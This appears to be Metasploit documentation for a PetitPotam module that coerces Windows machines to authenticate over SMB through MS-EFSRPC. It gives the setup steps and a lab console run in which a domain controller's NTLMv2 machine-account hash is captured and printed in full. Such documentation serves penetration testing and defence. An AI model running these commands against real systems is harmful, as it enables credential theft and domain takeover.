## Vulnerable Application

Coerce an authentication attempt over SMB to other machines via MS-EFSRPC methods.

## Verification Steps
Example steps in this format (is also in the PR):

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/scanner/dcerpc/petitpotam`
4. Set the `RHOSTS` and `LISTENER` options
5. (Optional) Set the `SMBUser`, `SMBPass` for authentication
6. (Optional) Set the `PIPE` and `METHOD` options to adjust the trigger vector
7. Do: `run`

## Options

### LISTENER
The host listening for the incoming connection. The target will authenticate to this host using SMB. The listener host
should be hosting some kind of capture or relaying service.

### PIPE
The named pipe to use for triggering.

### METHOD
The RPC method to use for triggering. If 'Automatic' is selected, then all methods will be tried until one appears
successful.

## Scenarios

### Windows Server 2019
In this case, Metasploit is hosting an SMB capture server to log the incoming credentials from the target machine
account. The target is a 64-bit Windows Server 2019 domain controller.

```
msf6 > use auxiliary/server/capture/smb 
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/capture/smb) > 
[*] Server is running. Listening on 0.0.0.0:445

msf6 auxiliary(server/capture/smb) > use auxiliary/scanner/dcerpc/petitpotam 
msf6 auxiliary(scanner/dcerpc/petitpotam) > set RHOSTS 192.168.159.96
RHOSTS => 192.168.159.96
msf6 auxiliary(scanner/dcerpc/petitpotam) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/dcerpc/petitpotam) > run

[*] 192.168.159.96:445    - Binding to c681d488-d850-11d0-8c52-00c04fd90f7e:1.0@ncacn_np:192.168.159.96[\lsarpc] ...
[*] 192.168.159.96:445    - Bound to c681d488-d850-11d0-8c52-00c04fd90f7e:1.0@ncacn_np:192.168.159.96[\lsarpc] ...
[*] 192.168.159.96:445    - Attempting to coerce authentication via EfsRpcOpenFileRaw

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 192.168.250.237
[SMB] NTLMv2-SSP Username   : MSFLAB\WIN-3MSP8K2LCGC$
[SMB] NTLMv2-SSP Hash       : WIN-3MSP8K2LCGC$::MSFLAB:cd561910093ed145:aeaef46507cc87aecebb99717d5e8753:01010000000000000022f245ce16d801be5bf7c8b735b582000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008000022f245ce16d80106000400020000000800300030000000000000000000000000400000f12b37e798747bd58bfa63fc5b99630354f0c31717d6ec25bfa2214b4352b8530a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200350030002e003100330034000000000000000000

[+] 192.168.159.96:445    - Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful
[*] 192.168.159.96:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/dcerpc/petitpotam) >
```
